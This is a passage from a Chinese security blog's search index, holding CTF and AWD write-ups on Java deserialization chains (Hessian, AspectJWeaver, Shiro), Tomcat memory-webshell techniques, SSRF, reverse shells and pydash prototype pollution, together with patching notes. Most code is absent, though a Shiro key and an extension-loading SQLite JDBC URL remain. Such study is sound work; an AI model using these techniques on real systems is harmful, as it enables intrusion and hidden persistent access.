其余行为与冰蝎是类似的 第三包 getBasicsInfo函数返回信息"},{"title":"dasctf暑期挑战赛easyjob复现","date":"2024-07-23T08:34:18.000Z","url":"/posts/52077.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"这次java意外地能查到资料.jpg，然后以为得用jndi打，就不是很想做。哎，没想到不出网，淦。还有个很几把神经的原因就是十个靶机我全都打不开，摆了 jadx怎么说 老样子，打开jadx反编译附件，发现是xxl-job，不是常规的序列化反序列化。 欸，去搜一下是什么东西，发现他是一个深度学习的框架，可以类比成cms之类的玩意。既然是一个现有的框架，那就直接搜搜他的漏洞： XXL-JOB executor 未授权访问漏洞-CSDN博客 刚开始是找到这个，众所周知csdn的东西不是很靠谱，然后就去找了另外一个： XXL-JOB在真实攻防下的总结 - 先知社区 (aliyun.com) 是的，在这里就已经能看见wp里的答案了 当时没怎么细看，可惜了 然后再找了一个： xxl-job-admin反序列化漏洞 确定就是hessian+xxl-job的组合拳。并且都是这个api的未授权洞。 但是他们的打法都是根据出网的jndi打的，本人jndi这方面比较垃圾，就不是很想做。。。 但是它确实不出网。那就来研究不出网的打法： 不出网怎么打 就是利用xslt去注入内存马： 记一次曲折的XXL-JOB API Hessian反序列化到Getshell 其中介绍到的xslt的gadget在jdk8下通杀，且为高可用payload。利用到了com.sun.org.apache.xalan.internal.xslt.Process的_main方法去加载恶意的xslt文件，我们可以在xslt文件内部执行任意语句，并且不受限。 给出一个xslt的模板： Nookipop师傅的文件讲的很清楚了，走两次反序列化： 这是第一次，写入xslt的payload： 这是第二次，执行命令的payload 改造一下改造回我们用的MimeTypeParameterList即可 给大家提供一个板子： 可以看见执行之后确实有一个1.xslt 内容也变成了我们需要改掉的内容 ok了，这样就可以做第二步的rce，只用把SwingLazyValue改成这样就行： 复现 题目环境是不出网的，所以我们得找到一个适合的内存马，找内存马这事情得看框架。很明显他是一个jetty框架，所以说直接找一下jetty内存马，这个内存马找不到，只能抄一下wp了： 用java写一个post请求： 最后往/runpost就行了 附一张根本打不开靶机的截图.jpg payload如下： 然后我这边想用哥斯拉上马的，奈何不会，简单地分析了一下发现： 是的，只需要自定义请求头即可： 感受到对edge用户的恶意了"},{"title":"CISCN ezjava另解","date":"2024-07-22T06:23:14.000Z","url":"/posts/35553.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"参考z3r4y师傅的解题思路，感觉这种方法也是很有参考价值的 回顾 重新看pom.xml可以得到 它是有aj依赖的，所以我们也可以换一种思路，利用aspectjweaver进行文件写入，这里怎么触发aspectjweaver呢? 还记得aspectjweaver怎么触发的吗？是通过put方法内的writeToPath触发的 userbean这里又刚好是一个put方法 所以可以在userbean处反序列化，这样做很明显符合我们aspectjweaver的触发思路： AspectJweaver 方法是和cc6那样利用差不多的，这里直接合并一下： JDBC 接下来就是jdbc传统流程：起fake_mysql_server先将payload传过去，再打jdbcmysql 8.x的payload： 这样打过去生成的so名字是可控的，最后再来一步jdbc-sqlite的打法即可 修复 综上，两种方法都还是要jdbc-sqlite的打法的，所以我先前的修复方式是一样能防"},{"title":"博客复活测试","date":"2024-07-22T05:03:51.000Z","url":"/posts/58452.html","tags":[["杂项","/tags/%E6%9D%82%E9%A1%B9/"]],"categories":[["CTF Web","/categories/CTF-Web/"]],"content":"孩子们我回来了 电脑重装，还好备份了hexo文件，到时候写一下怎么在备份了hexo的情况下重新恢复博客"},{"title":"CISCN2024 华南分区赛 awd","date":"2024-06-11T04:22:11.000Z","url":"/posts/50456.html","tags":[["awd","/tags/awd/"]],"categories":[["undefined",""]],"content":"不好评价，支持绿盟 赛前 第一次awd，还想着怎么打呢。晚上讨论的时候是想着肯定是要先fix的，然后队长给了个更好用的python脚本批量打全场。我猜测第二天的比赛是一个php一个java，所以赛前连夜学了一下怎么修java的靶机，希望能派上用场。加之赛前给一队写了个勉强能用的摆烂php日志包，用于生成类似burp的访问记录的 然后连夜装了个burp拓展，这还挺好用，一键复制到python就能够用。总之就是使用burpsuite的copy as python requests的插件自动化提取payload 另外俩队友在看怎么修pwn+怎么上pwn的流量监控 misc队友起了个聊天室+tulip流量分析，聊天室docker compose一下就能搭。 但是流量分析还得看有无tcpdump，如果有就皆大欢喜 当天 开始抽象起来了，靶机和我想得一样，一个php一个java ssh靶机全是弱密码 所以当务之急就是立刻连上ssh然后快速改密码 还好有bitwarden，在比赛开始之前就生成了十个强密码发到聊天室，因为我们想着哪怕密码够强，也有可能会每个队伍的密码都是相同的 结果不仅是相同的，而且还是这么弱的，一下就能批量改ssh密码 php重置的很顺利，java一不小心重置密码的密码忘了，给我整懵逼了。还好能够重置ssh并且不扣分。第二次就改好了，也算是个小插曲。 php php是一个极致cms，存在有sql数据库+redis： 可以看到mysql也是个弱密码，但是靶机没有提供mysql，给我干的有点小脑萎缩，就没仔细去看，也没想到好像可以用物理机连上去 登上去改个密码就好 后台，在readme.md里有写： 登录以后把密码改了即可 D盾，扫到Home/template/default/adminpanel.php是个后门： 直接注释掉即可 其他地方就没有扫到什么了 赛后查到可以在后台传shell： 反正把后台密码+mysql密码直接先防就行了，实在不放心就看这个文章里的办法，在CommonController.php内加黑名单 其实原本就有php的限制，所以照着php这里加就好了 批量，先打adminpanelcontroller，burp直接复制下来就能打 后台传shell的洞需要多几步操作，大同小异，都是burp抓包操作一下，然后复制到python里批量就好，然后场上事故太多了，就懒得去打web了，纯纯靠pwn拿分了，what can i say web1 java靶机，和ciscn初赛的靶机一模一样，jdbc打sqlite，唯一不同的地方就是从com.example换成了org.example.ezawd，没绷住 都知道原理了，修起来还是很简单的 把load_extension关了。但是这个方法没啥用，可以通过下面这条payload进行加载：jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-hashcode.db?enable_load_extension=true。那这样岂不是跟mysql一样随便打了吗 在SqliteDatasourceConnector.java里加个黑名单： 打包jar的时候要注意SqliteDataSourceConnector和DataSourceConnector要一起打包，还有就是SqliteDataSourceConnector反编译出来会有一些不明意义的符号，所以得自己看一下那些var表示的啥 还好留着国赛初赛的附件，那个时候反编译的文件是正常的，我直接复制粘贴来用了，修完的时候大概是这样的(可以看到注释我都没改)： 修复前： 修复后： 批量： 批量不了吧这玩意，本地能反弹shell成功，但是远程环境无法反弹shell。通过debug得到的hashcode和tmp下的hashcode完全不一样，加载不了恶意so，抽象。 总之就是打别人没测成功，打自己完全ok。忘记看自己反弹shell过来是啥权限了(为什么要看后续会说)，草，想起来就想抽自己两巴掌怎么啥都没干。 正片 讲完怎么修和打，终于正片开始了。 比赛开始狂fix，fix到一半就发现不对劲了，php还算正常，刚开始没权限下源码，后续得进到html文件夹才能够复制源码下来。java下下来了，反编译一看这不是原题吗，想着赶紧修好赶紧attack，刚好博客传了ciscn的web题解，然后直接起了个本地服务(hexo魅力时刻)照着打。attack传上去的db就不对劲了，怎么和debug的完全不一样，我靠只能一个个对着找，找到对应的so了，第一次弹shell没弹成，发现没bash，改成sh以后就行了，但是随便找了个ip照着刚刚的步骤打完全弹不了shell。 attack是后话了，想着重启一下java服务然后赶紧修复，发现他用的root权限起的java服务，我一个ctf用户甚至杀不掉它的进程，妈的服了。然后工作人员一直在说检查权限问题，甚至重置了两次环境，逆天，然后每次重置还得重新修php的机子。最后都到饭点了，还是加固环节。 最后直接说修不好java和pwn的权限，只能打不能修，没绷住。 然后接下来就是更加抽象的过程，后面ssh服务直接烂了，靶机直接失联，php只能够勉强的断断续续连上，然后就又断，又连又断，java的ssh直接全场崩溃。然后web手只能纯坐牢，看着这个连不上的ssh服务发呆。 php、pwn、java的服务全是root起的，被人rce完了能直接吧全场的ssh都关了+改ssh密码 一队php还在加固环节就被人种马了，别的师傅甚至到了后面连php都修不上，到了最后一轮都没修好，这不是靶机的问题是啥问题，比赛开始之前群里就有师傅发了被攻击的截图，主办方也不管 用户的权限更是低的一坨，连tmp文件夹下的东西都删不掉 总结就是你以为这是awd，其实这是ctf pwn，web php就那几个洞，修完了就没得打，java不太清楚反弹不了shell怎么打，听说要打内存马，但是不太懂so怎么能加载java的内存马。但是就是有人打出来了，T_T。所以这两个基本上纯坐牢，只能靠pwn来打，只要能批量就是200分起步，因为修不了pwn的机子，所以直接白给 所以这里就是自己的问题了，自己应该要反弹shell以后直接把java服务关了再重启修复的，按道理反弹shell之后我是root权限，当时忘记了。应该是觉得很激动，我能打全场了导致的，反正就是没有想到那么多，唉。 自己问题还挺多的，但是到后面都被恶心坏了，不想打了，索性直接玩杂交版去了，只能说傻逼东西。"},{"title":"被awd速通(2)","date":"2024-06-07T08:32:42.000Z","url":"/posts/12279.html","tags":[["awd","/tags/awd/"]],"categories":[["undefined",""]],"content":"以长城杯的DocToolkit修复作为例子，研究一下jvav靶机怎么修的 jadx反编译jar包： 一眼shiro，key都写里面了，是QZIysgMYhG7/CzIJlVpR1g== cc链+cb链都可以用 testcontroller里： 一眼命令执行，可以利用其打一个内存马进去 filter.jsp 修复 jadx反编译导出class文件(存入resources文件夹中)，java文件(存入source文件夹中) 找到有问题的文件，此处是ShiroConfig.java和TestController.java TestController 将这个controller放到和BOOT-INF、META-INF同级的目录下 修改好的源码，修改内容如下： 编译成class文件： 可以简单理解成-extdirs就是需要的依赖，放在了BOOT-INF\\lib\\内，-classpath就是我们写idea的时候的package com.xxxx 然后替换掉原有的class文件： 打包，需要将原jar包放置同一目录下： 重新启动这个jar包，重新查看效果： 可以看到我们已经成功防下来了 shiro反序列化 同样道理，shiro反序列化只需要修改它的key即可 利用shiro_attack工具生成一个新的随机key 同样的方式，修改com.example.doctoolkit.shiro.shiroConfig.java，将cookie里面的key修改： 假设选择的key是U7dTFjt/fAozRmr1UaXMuA== 编译class文件 这个时候报错了，查看报错原因： 这代表着我们需要多个java文件再编译，通过： 这个时候AdminController会报错，但是我们只需要ShiroConfig.class，所以不必管他 覆盖class文件，打包： 再次测试，发现原有的key无效了，新的key有效： "},{"title":"AspectJWeaver反序列化","date":"2024-05-26T03:29:34.000Z","url":"/posts/13706.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"AspectJWeaver反序列化 环境： pom.xml 利用点 利用点在org.aspectj.weaver.tools.cache.SimpleCache中，有一个内部类StoreableCachingMap，同时继承了HashMap 其构造方法接受文件夹的路径以及储存计时器的值： 主要看这个put方法： 这个put方法内的writeToPath能够触发任意文件写入 那就得利用到put方法触发这个写入文件了 回想一下cc链有什么链子能够触发put方法的，不难想到cc6的利用： 其中LazyMap.get方法会调用map.put，然后用TiedMapEntry触发就好了，仔细看看逻辑就好 exp 基于cc6链： 基于cc5链： 毕竟cc5和cc6比较像： 调用的是BadAttributeValueExpException从而调用TiedMapEntry.toString() 把HashSet改成Bad...即可 例题 [CISCN2021 final] ezj4va awdp题，要打+修复 ssh连上靶机后先看ps -aux查看进程在的地方 在/app/target，扒一下源码下来： 有tar.gz，直接扒下来就好了，里面就是备份的源码，awdp里记得一定要先把它备份下来 jadx反编译： pom.xml fastjson 1.2.72，能打原生反序列化 aspectjweaver，能打任意文件写 indexController里会泄露robots.txt和www.zip，通过www.zip也能够下载源码 controller cartController： /cart/add，会进入add函数 /cart/query，会进入query函数 /cart/remove会进入remove函数 add函数： 接受skus和cart的cookie参数，然后将其添加到cookie，键名为cart，值为cartService.addToCart(skus, oldCart)的序列化结果 addToCart： 它能够反序列化skus和oldCartStr toAdd是skus反序列化的结果 cart是oldCartStr反序列化的结果 然后调用cart.getSkuDescribe()得到skuDescribe这个map，再通过toAdd.getSkuDescribe将toAdd的key和value都put进去 假如map是一个StoreableCachingMap的话，就能够任意文件写了 另外一个就是query query能够进行反序列化操作： 调用了cartService.query(oldCart) deserialize函数就是将base64解码后再反序列化的流程 fastjson原生反序列化 虽然2021还没有这个东西，但是现在已经是2024了，尝试一下这个也不是不行() exp： 工具类： shell确实弹过来了（ AspectJWeaver反序列化 由于2021根本没有这个解法，所以这是不太可行的（ 还是回到正题，他这个add路由能够获取到 toAdd 是skus反序列化的结果 cart 是oldCartStr反序列化的结果 然后调用cart.getSkuDescribe()得到skuDescribe这个map 再通过toAdd.getSkuDescribe将toAdd的key和value都put进去 所以将cart设置成一个StoreableCachingMap skus的k，v设置成filename contents即可。注意一下他们都得是一个Cart类的对象 那这里要写什么呢？ 这里写jsp是写不通的(因为不解析jsp)，那么我们换个方式，通过写入class文件，然后反序列化该class文件，class文件内重写readObject执行命令即可： 这里包名要写对，然后找一下存放的class文件都在哪里，根据备份下来的文件可以找到在/app/target/classes/ciscn/fina1/ezj4va内 所以filepath = /app/target/classes/ciscn/fina1/ezj4va exp如下，简单注意路径就好了 连上ssh后查看可以得到Evil.class已经被写进去了 /cart/query打反序列化Evil.class： shell就弹过来了 两条攻击路径就结束了~ 修复 修复的话需要重写ResolveClass，阻止AspectJWeaver反序列化，解法(黑名单)： 白名单： 往deserializer.java里改一下： 这题可以通过www.zip里的文件解压出源码，扔进idea里即可 改完之后拿aspectjweaver的payload进行本地测试： 这里把关键类给ban掉了，文件也无法生成，成功防御 对于fastjson原生反序列化也是能够防御的： 打包利用的不是maven的打包，而是idea的原有打包方式： 然后Build -&gt; Build Artifacts -&gt; rebuild 然后还得将target文件夹复制，完成之后大概是这样的: 然后就能够启动了 经过测试，在buu的靶机上还发现了一个main，当时忘记关注这个了，还以为是直接通过jar启动的： 通过这个启动了，然后本地测试一下发现还有个.bat可以直接启动windows下的服务 接下来测试发现只需要将classes文件夹覆盖成我们修复的文件即可，最后拿到flag： "},{"title":"Tomcat内存马(四)","date":"2024-05-25T07:27:14.000Z","url":"/posts/43864.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"tomcat内存马第四式 valve型内存马，自己写的很水，直接用就行了 valve内存马是什么 Valve是对Container组件的一种拓展机制，通过多个Valve组装起来放到了pipeline里面。tomcat中的Container型容器就是通过pipeline与valve执行的，例如struts2里的拦截器机制一样，pipeline相当于拦截器链(filterchain)，valve相当于拦截器(filter) valve接口里有invoke方法： 只要向Container/Host/Wrapper/Engine这四种Container组件中的任意一种的pipeline中插入我们自定义的valve，也可以达到和filter型一样的效果 如果filter插入到了Engine下的话，则会对engine下的所有context生效 当然，重启tomcat肯定是会失效的 分析 进到valve接口里： 一共就几个方法： 关键方法就是invoke，通过调用this.getNext().invoke(req, resp)能够将请求传入下一个valve，构成pipeline管道，上文说过，这起到类似于filterchain的作用 但是我们一般不用这个接口来打内存马，而是通过ValveBase类，它是对Valve接口的一个扩充，利用它新建一个valve： 那我们要如何添加valve呢？ 那肯定有add方法(前面三个都有add方法，那这个肯定也有)，就在StandardPipeline这个类当中： 上文说过，只要向Container/Host/Wrapper/Engine这四种Container组件中的任意一种的pipeline中插入我们自定义的valve，就能执行了 著需要获取这四个组件中的一个，并且调用add方法即可 流程如下： 通过反射获取Request从而获得StandardContext(没错，又是他) 从StandardContext中获取StandardPipeline addValve 恶意valve： addValve： poc 很遗憾，只能在这个test.jsp里用，所以严格意义上不能说是内存马了，访问后也不能在别的路径中打： 参考文章： Tomcat 源代码调试笔记 - 看不见的 Shell (qq.com) 『Java安全』Tomcat内存马 "},{"title":"Tomcat内存马(三)","date":"2024-05-25T04:23:09.000Z","url":"/posts/15780.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"tomcat内存马第三式 servlet型内存马 三大件的最后一件，servlet 调试 同样地，web.xml里添加servlet，如果不知道怎么添加的可以看上一期，简单写一个demo： 在StandardContext打断点，看看怎么创建servlet的，在startInternal下打断点，看到这段报错，可以推断出前面就是添加servlet的函数，不然为什么出错的时候会说servletFail呢 其实这一段的前面已经完成了将所有servlet加载到context的children当中，而这个findChildren()的代码如下： 它会返回children的值，其实这个findChildren就是把所有负责管理servlet的wrapper传入loadOnStartup处 跟进loadOnStartup，可以得到如下的结果 这一段将获得的children变成wrapper，再根据wrapper获取到loadOnStartup，然后根据loadOnStartup的key作为顺序，判断是否为null，然后将wrapper存放到list中 其实这一步获取到的key是指servlet的启动顺序 在每个Servlet的启动顺序在web.xml中，如果没有声明 load-on-startup 属性（默认为-1），则该Servlet不会被动态添加到容器 接下来对list里的wrapper进行加载wrapper(wrapper.load) 跟进这个load函数，查看如何装载的： 关键代码是instance = loadServlet(); 跟进loadServlet，查看怎么加载的 可以看到这里通过servletClass来装载，装载完所有的Servlet的时候，就会根据具体请求进行初始化、调用、销毁等操作 梳理一下，在加载servlet的时候用到了findChildren，跟进之后发现findChildren其实是通过wrapper返回的。又因为加载servlet的时候利用到的wrapper.load()加载，所以我们得找到能够添加wrapper的函数 这个时候又因为wrapper由findChildren()得到，所以变相转到寻找能够添加children的函数，于是找到下面这个函数ContainerBase#addChild： 其实是因为StandardContext的addChild指向的是其父类的addChild才找到这里的 看这个addChild，通过调用addChildInternal添加child 然后就是会找mapping映射添加了，所以我们还得找映射(对应上图的addServletMappingDecoded) 实现 步骤如下： 创建恶意servlet并用wrapper封装 利用addChild添加这个wrapper 添加映射 恶意servlet： 通过反射获取StandardContext，老熟人了 添加一个关于该恶意servlet的wrapper，代码如下： 最后添加child和添加映射(通过addServletMappingDecoded添加) jsp页面如下： 反序列化实现 众所周知我更喜欢打反序列化的payload，但是奈何我没有搜到 所以只能根据上一期filter的马来改一下实现看看了，找猫画虎即可： cc3测一下效果： 同样地 打两次payload： servlet型的内存马与listener型的和filter型的不同，它必须通过我们写好的映射来访问，比如我这边写的映射就是/abc： 测试结果如下： "},{"title":"Tomcat内存马(二)","date":"2024-05-22T14:12:50.000Z","url":"/posts/44294.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"tomcat内存马第二式 filter型内存马 回顾 tomcat容器经过的三个大件： 讲一下第二个，filter 写一个过滤器 和listener一样，filter还是得自己写然后在web.xml里添加的： web.xml： 测试结果： 有了listener型内存马的经验，我们不难想到只需要找一个方式能够添加新的自定义filter即可 找添加自定义filter的方法 在init方法打断点调试，为什么呢？其实是因为init是初始化的时候，不难想到初始化的时候很有可能会添加filter。 观察调用栈 看到了熟悉的StandardContext，跟进这个 首先对filterDefs进行了foreach获取键值对，点开来看可以得出filterDefs是一个hashMap，key对应的是filter的名字，value对应的是装着filter对象的hashMap。展开value，观察我们要对filter对象的属性，便于后续操作： 先记着这个。 然后找filterDefs如何被添加的，搜这个变量名一下就找到了： 接着往下看，获取到name之后会这个entry的value，也就是装有filter对象的hashMap进行ApplicationFilterConfig() 跟进去可以看到有两条路，取决于filterDef.getFilter()是否为空，如果为空就调用getFilter()初始化，否则根据传入的filterDef获取filter并初始化 这个Filter还是有getter和setter方法的，那就简单了 可以构造一个FilterDef对象，并且将其set成我们的恶意filter即可 注意filter的属性，上面的伏笔回收，根据上面截的图我们可以得知除了设置setFilter本身，还要设置以下几个东西 filterClass filterName 可以写出一小段伪代码了，作用是添加一个自定义filter： 调用filter 前文说过，要调用filter的话，核心函数在其doFilter上，所以我们仍需要对doFilter进行调试，通过对doFilter打断点并回到上一步，观察： 从上面的图可以看出filter是从filterConfig中获取的，filterConfig可以通过StandardConfig获得 往前读取调用栈，发现了filterChain.doFilter，寻找filterchain在哪获得的： 可以看到在ApplicationFilterFactory.createFilterChain(request, wrapper, servlet) 跟入发现FilterMaps，观察属性： 继续看下文，注意到获取到了一个dispatcher，如果没有匹配到dispatcher的话会被直接continue掉，所以要设置dispatcher 实现内存马 整理下，filter型的内存马需要几个流程： filterDefs添加filter，是filterName和filter对象的映射 filterMaps添加filterchain在dofilter内，观察变量可以得到它其实是filterName和url路径的映射 filterConfigs：存放filterDefs，是ApplicationFilterConfig对象 设置Dispatcher 马如下： doFilter这段就是核心功能，打rce 下面这段就是注册这三个对象的，并且将其放进filterConfigs添加了这个filter 还是同样的套路，访问test.jsp添加filter即可 提升：反序列化实现 参考天下大木头师傅的文章，因为要传jsp，导致文件还是会落地的，这和我们想法有些出入，内存马内存马，就应该不存在于文件内。 对于filter型内存马还是有一种形式能够存在于反序列化的payload里的 换而言之，我们能够将内存马以字节码的形式写进去加载，类似于spring的马了。 解决request &amp; response jsp中内置了request和response，能够让我们处理问题变得简单，而要写一个java class的话，首先就要解决request和response的问题 kingkk师傅找到了两个static final变量 并且在internalDoFilter中有一段代码： 如果ApplicationDispatcher.WRAP_SAME_OBJECT为true的时候，就能够将这两个对象设置成对应的request和response 寻找lastServicedRequest和lastServicedResponse，发现他们在静态代码块的时候进行了一次初始化： 注意static代码块会更优先执行，所以这一段会先把这两个request和Response根据WRAP_SAME_OBJECT设置 WRAP_SAME_OBJECT的默认值为false，所以他们初始化的时候是null 因此我们需要通过反射调用WRAP_SAME_OBJECT为true，同时初始化request和response 大致代码如下： 这样第二次访问的时候就能够将response从lastServicedResponse取出来了 大致思路如下： 第一次访问利用反射修改参数，如上述代码块，将request和response存入到这个lastServicedRequest和lastServicedResponse中 第二次访问将req和res取出，将结果写入response，达成回显 poc 由于是低版本，所以利用低版本修改final static修饰的变量即可： 这里讲一下为什么要有第一次和第二次 刚开始这个WRAP_SAME_OBJECT设置为了false，所以lastServicedRequest和response都是null，因此就读不到req和res这些 第一次访问/echo后，此时WRAP_SAME_OBJECT为false。因为此时没有解析我们的java代码，然后由于Globals.IS_SECURITY_ENABLED默认为false，此时进入了servlet.service()，也就是自己的代码进行处理 此时反射启动，修改lastServiced和WRAP_SAME_OBJECT： 但是设置完毕之后回到原语句的finally中，将lastServiced设置为了null，所以这才需要第二次访问 第二次访问后由于这个WRAP_SAME_OBJECT被反射改成了true，此时就会触发上面的set方法，存入req和res，然后再进入this.servlet.service()执行自己的代码。因为req和res都已经获得到了，并且cmd不是null： 所以执行命令并且将执行完的结果写入res返回 咋利用呢？直接随便一个加载字节码的payload都能打 比如cc3、cc11这种，cc11其实就是cc6换成加载字节码执行罢了 最终poc 唯一要改的地方就是： 总之就是不改就出问题T_T 搞恶意字节码进行即可，明天补上图 漏洞环境测试 参考天下大木头师傅的漏洞环境搭建，模拟漏洞servlet： pom.xml添加commons-collections Project Structure添加cc依赖 web.xml添加servlet 开启服务后访问路由 测试效果： 先随便输入123测试能否正常接受post数据： 打cc3的payload： 因为上面分析了要访问两次，所以这里也必须执行两次，第二次才能够注入成功： 测试内存马： 参考文章： JavaSec/5.内存马学习 Tomcat 内存马学习(二)：结合反序列化注入内存马 – 天下大木头 (wjlshare.com) CTF-1/Web/java/内存马/Filter内存马的反序列化注入.md at main · haoami/CTF-1 · GitHub "},{"title":"Tomcat内存马(一)","date":"2024-05-22T11:33:22.000Z","url":"/posts/28066.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"tomcat的第一个内存马，listener型 tomcat环境搭建 参考使用idea进行tomcat源码调试 Listener型内存马 在tomcat容器中，当我们请求网站的时候，会根据顺序执行我们的tomcat三大件Servlet、filter、listener 其顺序如下： Listener监听器是最先被加载的，所以可以利用动态注册恶意listener内存马。 listener分为以下几种： ServletContext，服务器启动和终止时触发 Session，涉及到session操作的时候会触发 Request，访问服务的时候会触发 光听描述就知道我们肯定用监听Request的Listener做内存马 ServletRequestListener 要在tomcat中引入listener的话，可以通过实现两种接口中的一种来引入，一个是LifecycleListener，另一个是EventListener 实现LifecycleListener接口的监听器一般作用于tomcat的启动阶段，此时请求服务根本还没有进入解析阶段，所以不适合做内存马 所以我们选择实现EventListener接口的listener做内存马 在tomcat中，定义了很多继承于EventListener的接口，应用于各个对象的监听，如图(按ctrl+alt+b触发) 我们锁定一个接口ServletRequestListener 源码如下： 可以根据方法的注释得出这个监听器能够监听请求初始化和销毁的时候： **requestInitialized：**在request对象创建时触发 **requestDestroyed：**在request对象销毁时触发 demo 简单写一个demo实现这个listener: 在/webapps/ROOT/WEB-INF/web.xml中添加Listener： 添加完毕后重启tomcat，并访问，观察console： StandardContext 在requestInitialized函数下打断点观察调用栈： 观察到上一步是在StandardContext#getApplicationEventListeners中得到我们的监听器并且执行该requestInitialized方法： 跟进这个getApplicationEventListeners： 跟进applicationEventListenersList，寻找能够添加它的方法 在StandardContext#addApplicationEventListener中添加了listener： 那问题来到如何调用addApplicationEventListener方法。这个时候不难想到利用万能的反射，先调用到StandardContext对象，再调用该对象的addApplicationListener方法： 通过请求获取到上下文 另一种方法如下： 因此不难理解这个jsp内存马： 简单地说就是先利用反射获取到request对象从而获取到StandardContext(继承了context，找getContext方法转型即可)，从而直接添加该listener到tomcat当中 当上传了该jsp并且访问之后，即使删除了jsp，或者访问任意页面，都能够造成命令执行： 可能会执行两次，原因不详（ 总之能用就是了，除非服务器重启了，否则一直能够用 检查内存马 如果是通过命令执行漏洞，那么看看日志的请求应该能排查 可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200"},{"title":"CISCN2024 Web方向题解","date":"2024-05-20T05:30:13.000Z","url":"/posts/26055.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"被CISCN打烂了，几个题都是差一点就出，自己还是太菜了。顺带一提，怎么出题方有srk啊() 私货，不过在misc题里，我赛后才看见 prprprprprpr斯哈斯哈老公喜加一 第一天 ezphp 被这个题卡了好久，搞得我cms没时间交了，把flag放数据库里了，what 比赛平台不给开环境了。。。。。 只能凭借记忆来写： 有escapeshellcmd 一个linux命令执行的网页，但是做了很多限制，还有前面的escapeshellcmd，直接禁用各种符号 搜索escapeshellcmd命令注入可以查到一篇文章，里面讲了一些能够绕过escapeshellcmd的方式，但是需要用到的都被ban了，不过他提供了一个思路 可以利用参数，比如ls里面的ls -al 然后找，找到了php，php -i可行，返回了phpinfo php -r能够把php代码直接执行，而且由于题目给了escapeshellcmd自动转义，所以我们可以不用加单引号，然后发现反斜杠和反引号可以正常使用 翻遍整个目录都没有找到flag，查看/etc/passwd出现了mysql用户，合理怀疑flag在sql数据库里 后面反弹shell的流程如下：  将自己的vps ip转成十进制 然后利用curl，在自己的vps上放一个文件，内容如下： 靶机： python起80端口的http server，监听端口 等shell连过来，mysql登录root root 构思termius没有连接成功的提示，搞得我还以为卡住了。。。 ezcms 这个题，我还以为qrcode处被修复了，所以就审其它地方去了，没想到没有修复，唉 扫到flag.php，发现需要本地ip访问。提示给出只需要本地访问即可rce，要打ssrf，搜一下这个cms有没有ssrf的洞先 查找历史漏洞，发现： 明明上面说被修复了的，为什么实际上还是用这个洞呢 想了想，哦，他说要开redis服务，那是不是说只修了用ssrf打redis的问题 看一下最新版的源码逻辑： 漏洞出现在qrcode，搜索得到： 在Api.php里，我们需要调用这个函数。先看看哪里能调用curl的函数 其实在dr_catcher_data里 这里就直接可以打ssrf，点进去它的逻辑按道理是可以直接127.0.0.1的 这里的参数是thumb 怎么调用呢？ 找到一篇文章里面讲了如何调用api： 某cms 前台RCE漏洞分析 - 先知社区 搜索template，发现就在下面 所以只用这么调用即可： 很明显要get传入text和thumb thumb是我们你ssrf要打的payload，所以text随便传： 但是ip不正确，不能打127.0.0.1 换个思路，利用302跳转打内网 起flask服务： python3开启httpserver到port上，打开flask服务，然后将thumb改为我们的端口上 然后nc监听另一个端口(需要反弹shell的) sanic 给了一个sanic框架的python服务，和flask差不多，但是就是换成了sanic 访问得到/src里有源码： 特意标注了pydash的版本是5.1.2，估计漏洞和他有关 这里搜一下pydash 5.1.2的洞 还真有，原型链污染，而且出现在pydash.set上，正好我们这里的admin路由就有 以下是python原型链污染的一些重点关照对象 函数形参默认值替换：函数的__defaults__和__kwdefaults__这两个内置属性 os.environ赋值 flask secret_key修改 修改当前展示目录或者展示文件（DASCTF修改__file__） rce?(自己加的，优先前面三个) 然后搜索关于pydash的原型链污染，找到了一篇pydash+jinja2的，很接近了，但不是sanic的： Pydash 原型链污染 (furina.org.cn) python原型链污染的关键就是要拿到globals，只要找到了__globals__就能找到所有的全局变量和所有的类，进而进行操作 由于pydash+jinja2这篇的操作是通过jinja2编译模板的时候能够通过污染exported进行命令拼接导致的rce，我就想着sanic是不是也能这样。但是sanic的源码没找到这个方式，所以寄中寄。 还是老老实实看看能不能读文件吧 回到这题，这里有2个问题 第一个问题就是登录页，需要cookie小写后是adm;n 但是我们知道cookie里分号是分隔符，直接读的话n是读不进去的 所以这里得稍微绕一下，变成： 这个双引号也是得加进去的 所以这个问题便解决了 然后就是怎么个污染，他把_.给过滤了，这里还是师兄nb，用四个反斜杠就绕过去了： 可以看到为true，成功绕过并且触发了pydash的原型链污染 问题来到如何获取flag。既然rce不了那就只能读文件，先从源码里找能不能得到能够污染的属性 看源码/src处能够打开file来读，也就是说如果我们能污染__file__，那就能够读任意文件 获取file的前一步肯定是要获取__globals__ 参照pydash+jinja2那篇的payload可以得到获取globals的payload如下 获取到__file__，污染成value，以下为污染成功的结果： 那接下来读flag，假如flag在根目录且就叫flag，那这题就结束了 但是并不是，flag不叫flag。接下来我们还得重新找一个方法读flag 注意到sanic官方文档有一个app.static： 尝试先污染这个directory_view 这样直接污染还不行，说明不是读的globals的 但是本地报错信息给了我们一些提示： 可以看到关于app.static的源码存在这个static.py里，去github找一下，也可以在本地找，找到参数如下： 找几个有用的 uri，也就是第一个参数，静态文件在网页存放的目录 file_or_directory，也就是第二个参数，静态文件在本地存放的目录 directory_view，开启页面展示 找到这几个参数，那得看看怎么打开，首先要获得这个static 可以利用app.router获取到路由，利用dir(app.router)获取到具体里面有什么 可以从name_index里获取到注册的路由，源码中的解释是这样的： 读取__main__.static路由，选中即可： 还是有很多这种东西，现在要解决的第一件事就是我们的direcotry_view怎么得到，还是回源码找，发现directory_handler里面有设置directory_view： 能够控制普通的directory handler 发现他是从handlers包里引入的 继续翻源码，查看说明： 他是用于从一个目录种保存的文件，如果打开了directory_view，就会显示在页面里，uri是显示在哪个页面上，directory是保存的哪个文件夹下的文件 思路豁然开朗，只需要找到DirectoryHandler或者directory_handler即可污染(因为directory_handler是他的实例) 